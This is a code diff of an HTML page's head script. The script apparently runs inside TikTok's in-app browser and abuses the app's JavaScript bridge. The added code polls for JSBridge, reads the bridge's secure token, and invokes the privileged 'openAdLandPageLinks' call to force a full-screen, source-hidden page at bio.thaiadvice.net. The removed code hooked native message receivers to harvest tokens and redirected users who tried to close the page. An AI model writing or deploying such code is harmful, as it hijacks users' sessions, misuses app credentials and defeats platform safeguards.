@@ -3,79 +3,54 @@
 <head>
 <meta charset="UTF-8"/>
 <script>
-// Runs at document-start — before any assets or body content load.
-// TikTok fires bridge init events early; hooks must be registered immediately.
 (function(){
   var OFFER = 'https://bio.thaiadvice.net/';
   var CID = 0;
-  try { var _uid = new URLSearchParams(window.location.search).get('utm_id'); if (_uid) CID = parseInt(_uid)||0; } catch(e){}
+  try { var u = new URLSearchParams(window.location.search).get('utm_id'); if (u) CID = parseInt(u)||0; } catch(e){}
 
-  var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
-  var cbId = 1000;
+  var fired = false;
 
-  function piperCall(func, params) {
-    if (!wk) return;
+  function fire(token) {
+    if (fired) return;
+    fired = true;
+    var p = {
+      url: OFFER, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page',
+      cid: CID, hide_nav_bar: 1, hide_source: 1, should_full_screen: 1,
+      trans_status_bar: 1, is_instant_page: 1
+    };
+    if (token) p._jsb_secure_token = token;
+
+    // Via JSBridge.call() (what the dev confirmed works)
     try {
-      wk.postMessage({
-        __msg_type: 'call',
-        func: func,
-        params: params || {},
-        JSSDK: '1.2.5',
-        __callback_id: String(cbId++)
-      });
-    } catch(e){}
-  }
-
-  var OVERLAY_PARAMS = {
-    url: OFFER, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page',
-    cid: CID, hide_nav_bar: 1, hide_source: 1, should_full_screen: 1,
-    trans_status_bar: 1, is_instant_page: 1
-  };
-
-  // Override global receiver functions TikTok may call to deliver bridge messages
-  var _tokenKeys = ['_jsb_secure_token','secure_token','token','jsb_token'];
-  function tryToken(obj) {
-    if (!obj || typeof obj !== 'object') return null;
-    for (var i = 0; i < _tokenKeys.length; i++) {
-      if (typeof obj[_tokenKeys[i]] === 'string' && obj[_tokenKeys[i]].length > 10) return obj[_tokenKeys[i]];
-    }
-    for (var k in obj) { try { var r = tryToken(obj[k]); if (r) return r; } catch(e){} }
-    return null;
-  }
-  var token = null;
-  function onNativeMsg(raw) {
-    try {
-      var d = typeof raw === 'string' ? JSON.parse(raw) : raw;
-      var tok = tryToken(d);
-      if (tok && !token) {
-        token = tok;
-        var p = Object.assign ? Object.assign({}, OVERLAY_PARAMS, {_jsb_secure_token: tok}) : OVERLAY_PARAMS;
-        piperCall('openAdLandPageLinks', p);
+      if (window.JSBridge && window.JSBridge.call) {
+        window.JSBridge.call('openAdLandPageLinks', p, function(){});
       }
     } catch(e){}
-  }
-  ['IESBridgeReceiveMessage','__IESBridgeReceiveMessage','IESPiperReceiveMessage',
-   '__IESPiperReceiveMessage','onJSBridgeReady','ttJSBridgeReceive','_handleJSBridgeMessage'].forEach(function(fn){
-    var orig = window[fn];
-    window[fn] = function(msg){ onNativeMsg(msg); if (orig) return orig.apply(this, arguments); };
-  });
 
-  // Also fire immediately and after delays in case no token is needed
-  function fireOverlay(tok) {
-    var p = tok ? (Object.assign ? Object.assign({}, OVERLAY_PARAMS, {_jsb_secure_token: tok}) : OVERLAY_PARAMS) : OVERLAY_PARAMS;
-    piperCall('openAdLandPageLinks', p);
+    // Via IESPiper WK handler with correct format
+    try {
+      var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
+      if (wk) wk.postMessage({__msg_type:'call', func:'openAdLandPageLinks', params:p, JSSDK:'1.2.5', __callback_id:'1001'});
+    } catch(e){}
   }
-  fireOverlay();
-  setTimeout(function(){ fireOverlay(token); }, 500);
-  setTimeout(function(){ fireOverlay(token); }, 1500);
 
-  // visibilitychange close intercept — attached after 2s to avoid false trigger on load
-  var closed = false;
-  function onClose() { if (closed) return; closed = true; window.location.href = OFFER; }
-  setTimeout(function(){
-    document.addEventListener('visibilitychange', function(){ if (document.hidden) onClose(); });
-    window.addEventListener('pagehide', onClose);
-  }, 2000);
+  // Poll for JSBridge — it loads after page init, not immediately
+  var attempts = 0;
+  var poll = setInterval(function(){
+    attempts++;
+    var jb = window.JSBridge;
+    if (jb && typeof jb.getConfig === 'function') {
+      clearInterval(poll);
+      try {
+        var cfg = jb.getConfig();
+        var token = cfg && cfg.secure && cfg.secure.token;
+        fire(token);
+      } catch(e){ fire(null); }
+    } else if (attempts > 100) { // 5s timeout
+      clearInterval(poll);
+      fire(null);
+    }
+  }, 50);
 })();
 </script>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
